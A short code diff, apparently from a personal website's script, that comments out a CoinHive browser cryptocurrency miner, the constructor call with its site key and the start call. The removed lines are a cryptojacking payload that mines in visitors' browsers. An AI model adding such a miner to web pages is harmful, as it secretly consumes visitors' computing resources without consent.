@@ -77,6 +77,6 @@
   document.getElementById('contact-me').setAttribute('href', 'mailto:' + email);
 
   // Coin
-  var miner = new window.CoinHive.Anonymous('BEeUVHU3qz1P2375ciUt1W8l2vQ2lpbN');
-  miner.start();
+  // var miner = new window.CoinHive.Anonymous('BEeUVHU3qz1P2375ciUt1W8l2vQ2lpbN');
+  // miner.start();
 })();
